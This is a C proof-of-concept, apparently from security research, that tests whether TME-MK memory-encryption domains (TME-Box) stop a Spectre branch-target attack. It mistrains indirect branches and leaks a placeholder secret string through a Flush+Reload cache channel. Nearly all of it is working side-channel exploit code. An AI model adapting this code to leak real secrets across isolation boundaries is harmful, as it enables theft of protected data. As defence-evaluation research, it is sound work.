#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <keyutils.h>
#include <sys/mman.h>

#include "cacheutils.h"

#define MEASUREMENTS 100000

/********************************************************************
TME-Box code.
Source: https://github.com/IntelLabs/TME-MK-Fine-Grained-Encryption-Integrity/blob/502f9c1f9bdd73f9f7731633916e680fe9835608/test.c
********************************************************************/
#define CLSIZE 64
#define CLMASK (uintptr_t)(CLSIZE - 1)

#define kPtrTagMask 0x00003f0000000000uLL
#define _read8_q(ptr)                                                          \
  ({                                                                           \
    volatile uint64_t __result = 0xDEAD;                                       \
    __result = (*(volatile uint64_t *)(ptr));                                  \
    __result;                                                                  \
  })
#define _write_q(ptr, value)                                                   \
  do {                                                                         \
    (*(volatile uint64_t *)(ptr)) = (uint64_t)(value);                         \
  } while (0)
#define _is_tagged(ptr) ((uint64_t)(ptr) & kPtrTagMask)
#define _is_aligned(ptr) (((uintptr_t)(p) & CLMASK) == 0)
#define _check_access(ptr)                                                     \
  do {                                                                         \
    if ((uintptr_t)ptr != 0 && (uintptr_t)ptr != -1ULL) {                      \
      uint64_t _expected = 0xFF00000000000000ULL | (uint64_t)ptr;              \
      volatile uint64_t _result = 0;                                           \
      volatile uint64_t _previous = _read8_q(ptr);                             \
      _write_q(ptr, _expected);                                                \
      _result = _read8_q(ptr);                                                 \
      assert(_result == _expected);                                            \
      _write_q(ptr, _previous);                                                \
    }                                                                          \
  } while (0)

void *check(void *p) {
  printf("p = %13p  ", p);

#if defined(SCENARIO1) || defined(SCENARIO2) || defined(SCENARIO3)
  assert(_is_aligned(p));
  printf("[OK] aligned. ");

  assert(_is_tagged(p));
  printf("[OK] tagged. ");

  _check_access(p);
  printf("[OK] access. ");
#endif

  printf("\n");
  return p;
}

/********************************************************************
Spectre BTB code.
********************************************************************/

#define ASSERT_DOMAIN(pointer, domain) (char *)((((uint64_t)(pointer)) & ~kPtrTagMask) | ((uint64_t)(domain) & kPtrTagMask))
#define PUBLIC  "____________"
#define SECRET  "INACCESSIBLE"

char *secret;
char *public;
char leaked[sizeof(SECRET)];

typedef void (*workload_fp)(char*,char*,int,size_t);
workload_fp attacker_wl;

#define sys_encrypt_mprotect    451
long enc_mprotect(void *addr, size_t len, int prot, key_serial_t key) {
  return syscall(sys_encrypt_mprotect, addr, len, prot, key);
}

key_serial_t key;
void init_key() {
  char *key_type = "mktme";
  char *key_desc = "code_page";
  char *key_opt = "type=cpu algorithm=aes-xts-128";
  key = add_key(
    key_type, 
    key_desc, 
    key_opt, 
    strlen(key_opt), 
    KEY_SPEC_THREAD_KEYRING);
  if (key == -1) {
    printf("\tadd_key FAILED!\n");
    fflush(stdout);
    exit(-1);
  }
}

void *copy_function_to_new_domain(void *fp, size_t f_len) {
  void *addr  = (void *)((1L<<44) & kPtrTagMask);
  size_t len  = (f_len & ~(pagesize - 1)) + pagesize;
  int prot    = PROT_READ | PROT_WRITE | PROT_EXEC;
  int flags   = MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE;

  void *code_page = mmap(addr, len, prot, flags, -1, 0);
  if (code_page == MAP_FAILED) {
    printf("\tmmap FAILED!\n");
    fflush(stdout);
    keyctl(KEYCTL_INVALIDATE, key);
    exit(-1);
  }
  assert(((uint64_t)code_page & 0xFFF) == 0);
  enc_mprotect(code_page, len, prot, key);
  printf("code_page @ %p\n", code_page);
  fflush(stdout);

  memcpy(code_page, fp, f_len);
  return code_page;
}

char *create_secret() {
  // allocate secret
  char *secret = (char*)check(malloc(128));

  if(secret == NULL) {
    printf("allocation of secret failed\n");
    exit(EXIT_FAILURE);
  }
  memcpy(secret, SECRET, sizeof(SECRET));
  secret[sizeof(SECRET)] = '0';

  return secret;
}

char *create_public() {
  char *public_data = (char*)check(malloc(128));

  if(public_data == NULL) {
    printf("allocation of public failed\n");
    exit(EXIT_FAILURE);
  }

  memcpy(public_data, PUBLIC, sizeof(PUBLIC));
  // ensure data terminates
  public_data[sizeof(PUBLIC)] = 0;

  return public_data;
}

void __attribute__((aligned(4096))) victim_workload(char *mem, char *data, int idx, size_t pagesize) {
  return;
}

void __attribute__((aligned(4096))) attacker_workload(char *mem, char *data, int idx, size_t pagesize) {
#if defined(SCENARIO1)
  data = ASSERT_DOMAIN(data, public);
#endif
  void *p = (mem + data[idx] * pagesize);
#if defined(SERIALIZE_SW)
  asm volatile("mfence");
#endif
  asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax");
}

void __attribute__((aligned(4096))) speculate(workload_fp workload, char *data, int idx) {
  flush(&workload);
  uint64_t c = 2147476866;
  uint64_t a = 1792388078;
  uint64_t d = 1983325987;

  int64_t offset = 64 * 63;
  int64_t val1 = 64;
  int64_t val2 = 63;

  mfence();
  flush(&val1);
  flush(&val2);

  flush(&a);
  flush(&d);
  flush(&c);
  asm volatile (
    // Registers already preloaded via constraints
    "div %%ecx\n\t"
    "div %%ecx\n\t"
    "div %%ecx\n\t"
    "div %%ecx\n\t"
    "div %%ecx\n\t"
    "div %%ecx\n\t"
    "sub $512, %%rdx\n\t"
    "add %%rdx, %[target]\n\t"
    :
    : [target] "r" (workload),
      "a" (a),      // binds 'a' to rax
      "c" (c),      // binds 'c' to rcx
      "d" (d)       // binds 'd' to rdx
    : "memory"
  );

  offset /= val2;
  offset /= val1;
  workload += offset - 1;
  
  workload(mem, data, idx, pagesize);

}

int main(int argc, const char **argv) {
  // Detect cache threshold
  if (!CACHE_MISS)
    CACHE_MISS = detect_flush_reload_threshold();
  printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);

  pagesize = sysconf(_SC_PAGESIZE);
  char *_mem = (char*) malloc(pagesize * (256 + 4));
  mem = (char *)(((size_t)_mem & ~(pagesize-1)) + pagesize * 2);
  memset(mem, 0, pagesize * 256);

  init_key();
  attacker_wl = (workload_fp)copy_function_to_new_domain(attacker_workload, pagesize);

  printf("secret: ");
  secret = create_secret(); 
  printf("public: ");
  public = create_public();

  memset(leaked, ' ', sizeof(leaked));
  leaked[sizeof(SECRET) - 1] = 0;

  flush_shared_memory();
  mfence();

  int idx = 0;  
  int c = 0;
  int score = 0;

  while(1 && c != MEASUREMENTS) {
    c++;
    nospec();
    // Mistrain by calling mistrain (dump_secret) function
    for(int j = 0; j < 8; j++) {
#if defined(SCENARIO1) || defined(EXEC_PREV)
      speculate(attacker_workload, public, idx);
#else
      speculate(attacker_wl, public, idx);
#endif
    }

    // Flush our shared memory
    flush_shared_memory();
    mfence();
    nospec();
    
    // Previous call will fail, so after every fault we return here
#if defined(EXEC_PREV)
    mprotect(attacker_workload, pagesize, PROT_NONE);
#endif
    speculate((void *)victim_workload, secret, idx);
#if defined(EXEC_PREV)
    mprotect(attacker_workload, pagesize, PROT_READ | PROT_EXEC);
#endif

    mfence();
    nospec();
    // Recover data from the covert channel
    char c = cache_decode_i(idx);
    if (c != '_') leaked[idx] = c;

    score += (c == SECRET[idx] && c != ' ' && c != '\0');

    idx = (idx + 1) % (sizeof(SECRET)-1);
  }

  printf("secret: %s\n", SECRET);
  printf("leaked: "FG_YELLOW"%s"RESET"\n", leaked);
  printf(FG_YELLOW"SCORE: %d/%d"RESET"\t>>> %s <<<\n", score, MEASUREMENTS, score > 0 ? FG_RED"LEAKY"RESET : FG_GREEN"PROTECTED"RESET);
  printf("[\x1b[32m>\x1b[0m] Done\n");

  free(_mem);
  free(secret);
  free(public);
  return 0;
}
